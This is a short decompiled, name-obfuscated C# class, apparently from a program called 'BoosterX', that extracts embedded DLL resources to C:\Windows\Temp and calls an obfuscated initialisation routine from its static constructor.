using System;
using System.IO;

// Token: 0x0200016C RID: 364
internal sealed class Class195
{
	// Token: 0x0600097F RID: 2431 RVA: 0x0002B8D0 File Offset: 0x00029AD0
	// Note: this type is marked as 'beforefieldinit'.
	static Class195()
	{
		Class195.smethod_1();
	}

	// Token: 0x06000980 RID: 2432 RVA: 0x0002B8D8 File Offset: 0x00029AD8
	public static string smethod_0(string string_0)
	{
		if (File.Exists("C:\\Windows\\Temp\\" + string_0))
		{
			return "C:\\Windows\\Temp\\" + string_0;
		}
		Class650.smethod_4("BoosterX", "C:\\Windows\\Temp\\", "Resources.EmbedRes.Dlls", string_0, false);
		return "C:\\Windows\\Temp\\" + string_0;
	}

	// Token: 0x06000981 RID: 2433 RVA: 0x0002B928 File Offset: 0x00029B28
	private static void smethod_1()
	{
		Class555.smethod_0().method_4(Class555.smethod_2(), "&ebiR()Q6N", null);
	}

	// Token: 0x04000585 RID: 1413
	public static Struct1 struct1_0;
}
